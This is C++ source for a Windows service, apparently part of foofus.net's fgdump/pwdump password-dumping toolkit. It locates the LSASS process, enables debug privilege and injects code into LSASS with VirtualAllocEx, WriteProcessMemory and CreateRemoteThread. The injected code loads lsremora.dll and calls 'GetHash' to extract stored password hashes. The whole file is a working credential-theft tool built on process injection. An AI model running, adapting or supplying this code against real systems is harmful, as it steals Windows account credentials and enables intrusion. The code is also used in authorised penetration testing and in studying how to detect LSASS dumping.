/*
Copyright �2008 foofus.net

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License Version 2, as published
by the Free Software Foundation.

This program is distributed in the hope that it will be useful, but WITHOUT
ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
FITNESS FOR A PARTICULAR PURPOSE.  The program may contain errors that
could cause failures or loss of data, and may be incomplete or contain
inaccuracies.  By using the program, you expressly acknowledge and agree
that use of the program, or any portion thereof, is at your sole and entire
risk.  You are solely responsible for determining the appropriateness of
using, copying, distributing and modifying the program and assume all risks
of exercising your rights under the license, compliance with all applicable
laws, damage to or loss of data, programs or equipment, and unavailability
or interruption of operations.   THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
EXPRESSLY DISCLAIM ALL WARRANTIES AND/OR CONDITIONS, EXPRESS OR IMPLIED,
INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES AND/OR CONDITIONS OF
MERCHANTABILITY, OF SATISFACTORY QUALITY, OF FITNESS FOR A PARTICULAR
PURPOSE, OF ACCURACY, OF QUIET ENJOYMENT, AND NONINFRINGEMENT OF THIRD
PARTY RIGHTS.  THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES DO NOT WARRANT
AGAINST INTERFERENCE WITH YOUR ENJOYMENT OF THE PROGRAM, THAT THE FUNCTIONS
CONTAINED IN THE PROGRAM WILL MEET YOUR NEEDS, THAT THE OPERATION OF THE
PROGRAM WILL BE UNINTERRUPTED OR ERROR-FREE, OR THAT DEFECTS IN THE PROGRAM
WILL BE CORRECTED. THE DISCLAIMER OF WARRANTY CONSTITUTES AN ESSENTIAL PART
OF THE LICENSE TO USE THE PROGRAM AND NO USE OF THE PROGRAM IS AUTHORIZED
EXCEPT UNDER THE DISCLAIMER.  ALSO, SOME JURISDICTIONS DO NOT ALLOW THE
EXCLUSION OR LIMITATION OF INCIDENTAL OR CONSEQUENTIAL DAMAGES, SO THAT
EXCLUSION AND LIMITATION MAY NOT APPLY TO YOU.  See the GNU General Public
License Version 2 for more details.

You should have received a copy of the GNU General Public License Version 2
along with this program; if not, write to the Free Software Foundation, 59
Temple Place, Suite 330, Boston, MA 02111-1307 USA.
*/

/*
	Special thanks to Soaring Moe! for 64-bit contributions!
*/

#define _WIN32_WINNT 0x0500

#include <windows.h>
#include <stdio.h>
#include "lsassthreadstub.h"

// Visual Studio 2005 displays security warnings. This disables display of those warnings so the build 
// experience is like that with earlier DevStudio 6.
#pragma warning(disable : 4996)

extern "C"
{
	int SetAccessPriv();
}

SERVICE_STATUS_HANDLE hSrv;
DWORD dwCurrState;
char* srvName = "servpw";

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    srvStatus.dwCurrentState = dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 3000;
    return SetServiceStatus( hSrv, &srvStatus );
}

void __stdcall PWServHandler( DWORD dwCommand )
{
    // not really necessary because the service stops quickly
    switch(dwCommand)
    {
    case SERVICE_CONTROL_STOP:
        TellSCM(SERVICE_STOP_PENDING, 0, 1);
        TellSCM(SERVICE_STOPPED, 0, 0);
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
        TellSCM(SERVICE_PAUSED, 0, 0);
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
        TellSCM(SERVICE_RUNNING, 0, 0);
        break;
    case SERVICE_CONTROL_INTERROGATE:
        TellSCM(dwCurrState, 0, 0);
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        break;
    }
}

typedef DWORD NTSTATUS;

typedef struct 
{
    USHORT Length;
    USHORT MaxLen;
    USHORT *Buffer;
} UNICODE_STRING;

struct process_info 
{
    ULONG NextEntryDelta;
    ULONG ThreadCount;
    ULONG Reserved1[6];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ProcessName;
    ULONG BasePriority;
#ifdef _WIN64
#ifdef _M_X64
	ULONG32 pad; 
#else
#error Only x64 has been tested with the ULONG32 pad. Comment this #error out if you want to test for this build.
	ULONG32 pad; 
#endif
#endif
    ULONG ProcessId;
    // etc.
};

typedef NTSTATUS (__stdcall *NtQSI_t)( ULONG, PVOID, ULONG, PULONG );
typedef LONG (__stdcall *RtlCUS_t)( UNICODE_STRING*, UNICODE_STRING*, ULONG );
NTSTATUS (__stdcall *NtQuerySystemInformation)( IN ULONG SysInfoClass, IN OUT PVOID SystemInformation,
																	  IN ULONG SystemInformationLength, OUT PULONG RetLen );
LONG (__stdcall *RtlCompareUnicodeString)( IN UNICODE_STRING*, IN UNICODE_STRING*, IN ULONG CaseInsensitve );


// Find the pid of LSASS.EXE
ULONG GetLsassPid()
{
    HINSTANCE hNtDll;
    NTSTATUS rc;
    ULONG ulNeed = 0;
    void *buf = NULL;
    size_t len = 0;
    ULONG ret = 0;

    hNtDll = LoadLibrary("NTDLL");
    if(!hNtDll)
        return 0;

    NtQuerySystemInformation = (NtQSI_t)GetProcAddress(hNtDll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation)
        return 0;

    RtlCompareUnicodeString = (RtlCUS_t)GetProcAddress(hNtDll, "RtlCompareUnicodeString");
    if(!RtlCompareUnicodeString)
        return 0;

    do 
    {
        delete[] buf;
        len += 2000;
        buf = new BYTE[len];

        if( !buf )
            return 0;

        rc = NtQuerySystemInformation(5, buf, (ULONG) len, &ulNeed);
    } while(rc == 0xc0000004);  // STATUS_INFO_LEN_MISMATCH

    if(rc < 0) 
    {
        delete[] buf;
        return 0;
    }

    // Find process info structure for LSASS
    {
        struct process_info *p = (struct process_info*)buf;
        bool endlist = false;
        UNICODE_STRING lsass = { 18, 20, (USHORT*) L"LSASS.EXE" };

        while(!endlist) 
        {
            if(p->ProcessName.Buffer && !RtlCompareUnicodeString(&lsass, &p->ProcessName, 1)) 
            {
                ret = p->ProcessId;
                goto exit;
            }
            endlist = p->NextEntryDelta == 0;
            p = (struct process_info *)(((BYTE*)p) + p->NextEntryDelta);
        }
    }

 exit:
    delete[] buf;
    FreeLibrary(hNtDll);

    return ret;
}

void InjectDll(HANDLE hProc, LPCTSTR lpszPipeName, BYTE* pEncryptionKey, DWORD dwKeyLen, BOOL bSkipHistories)
{
    SIZE_T sizetFuncSize;
    SIZE_T sizetBytesToAlloc;
    void* pRemoteAlloc = NULL;
    ThreadData rtData;
    HINSTANCE hKernel32;
    SIZE_T sizetBytesWritten;
    HANDLE hRemoteThread = 0;
    DWORD trc = 3;
    DWORD dwIgnored;
    char szBuffer[MAX_PATH];

    // Prepare the info to send across
    hKernel32 = LoadLibrary("Kernel32");
    rtData.pLoadLibrary = (pLoadLibFunc)GetProcAddress(hKernel32, "LoadLibraryA");
    rtData.pGetProcAddress = (pGetProcAddrFunc)GetProcAddress(hKernel32, "GetProcAddress");
    rtData.pFreeLibrary = (pFreeLibFunc)GetProcAddress(hKernel32, "FreeLibrary");
    rtData.pOutputDebugString = (pOutputDebugStringFunc)GetProcAddress(hKernel32, "OutputDebugStringA");

	memset(rtData.szPipeName, 0, 50);
	strncpy(rtData.szPipeName, lpszPipeName, 50);


    GetModuleFileName(NULL, szBuffer, sizeof(szBuffer));
#ifdef _WIN64
    strcpy(strrchr(szBuffer, '\\')+1, "lsremora64.dll");
#else
    strcpy(strrchr(szBuffer, '\\')+1, "lsremora.dll");
#endif
	strncpy(rtData.szDllName, szBuffer, sizeof(rtData.szDllName));
    strncpy(rtData.szFuncName, "GetHash", sizeof(rtData.szFuncName));

	// Dictate if we are skipping password histories
	rtData.bSkipHistories = bSkipHistories;

	// Copy the encryption key to the thread structure
	rtData.dwKeyLength = dwKeyLen;
	memset(rtData.byteKey, 0, 50);
	memcpy(rtData.byteKey, pEncryptionKey, dwKeyLen);

    // Determine amount of memory to allocate
	// Get function size.
	sizetFuncSize = GetLsaThreadFuncSize(); 
	// Size to allocate is size of function normalized up to next 16 byte boundary (this works for 32 and 64 bits).
	const SIZE_T sizetMaskLowNibble = (~(SIZE_T)0xF);
    sizetBytesToAlloc = (sizetFuncSize + 0x10) & sizetMaskLowNibble;
	// Add extra paragraph plus size of ThreadData
	sizetBytesToAlloc += 16 + sizeof(ThreadData);
	const SIZE_T sizetPaddedThreadDataSize = (sizeof(ThreadData) + 0x10) & sizetMaskLowNibble;

    // Allocate memory in remote proc
    pRemoteAlloc = VirtualAllocEx(hProc, NULL, sizetBytesToAlloc, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(pRemoteAlloc == NULL)
    {
        sprintf(szBuffer, "VirtualAllocEx failed: %d", GetLastError());
        return;
    }
    
    // Write data to the proc
    if(!WriteProcessMemory(hProc, pRemoteAlloc, &rtData, sizeof(rtData), &sizetBytesWritten))
    {
        sprintf(szBuffer, "WriteProcessMemory failed: %d", GetLastError());
        goto exit;
    }

	// Computer start of thread location in destination lsass process. 
	// We use this value to copy the code bytes from this process to the destination, 
	// and we also use it to create the thread.
	const PVOID pfThreadFuncLocation = ((PBYTE)pRemoteAlloc + sizetPaddedThreadDataSize);

	// Write code to the proc
    if(!WriteProcessMemory(hProc, (PBYTE) pfThreadFuncLocation,
						       GetLsaThreadFuncPtr() /*LsaThreadFunc*/, sizetFuncSize, &sizetBytesWritten))
    {
        sprintf(szBuffer, "WriteProcessMemory failed: %d", GetLastError());
        goto exit;
    }

    // Create the remote thread
    hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)((PBYTE) pfThreadFuncLocation),
														 pRemoteAlloc, 0, &dwIgnored);
    if(!hRemoteThread)
    {
        sprintf(szBuffer, "CreateRemoteThread failed: %d", GetLastError());
        goto exit;
    }

    // Wait for the thread to finish
    WaitForSingleObject(hRemoteThread, INFINITE);
    GetExitCodeThread(hRemoteThread, &trc);
    if(trc == -1)
    {
        sprintf( szBuffer, "Thread code: %d, path: %s", trc, rtData.szDllName );
    }

 exit:
    //clean up
    if(hRemoteThread) 
		CloseHandle(hRemoteThread);

    VirtualFreeEx(hProc, pRemoteAlloc, 0, MEM_RELEASE);
}


void __stdcall PWServMain(int argc, char* argv[])
{
    HANDLE hLsassProc;
    ULONG ulPid = 0;
    char buf[256];
    const char* szPipeName = argv[1];
	BYTE* pEncryptionKey = (BYTE*)argv[2];
	DWORD dwKeyLen = *(argv[3]);
	BOOL bSkipHistories = *(argv[4]);

    hSrv = RegisterServiceCtrlHandler(srvName, (LPHANDLER_FUNCTION)PWServHandler);
    if( hSrv == NULL ) 
		return;

    TellSCM(SERVICE_START_PENDING, 0, 1);

    // Enable the debug privilege
    if(SetAccessPriv() != 0)
        goto exit;

    // Get the LSASS pid
    ulPid = GetLsassPid();
    if(!ulPid)
    {
        goto exit;
    }

    // Open lsass
    hLsassProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ulPid);
    if(hLsassProc == 0)
    {
        sprintf(buf, "Unable to open target process: %d, pid %d", GetLastError(), ulPid);
        goto exit;
    }

    TellSCM(SERVICE_RUNNING, 0, 0);

    // Inject the dll
    InjectDll(hLsassProc, szPipeName, pEncryptionKey, dwKeyLen, bSkipHistories);

exit:
    TellSCM(SERVICE_STOP_PENDING, 0, 0);
    TellSCM(SERVICE_STOPPED, 0, 0);
    return;
}

int main()
{
    SERVICE_TABLE_ENTRY stbl[] = 
    {
        { srvName, (LPSERVICE_MAIN_FUNCTION)PWServMain },
        { NULL, NULL }
    };

    StartServiceCtrlDispatcher(stbl);
    return 0;
}

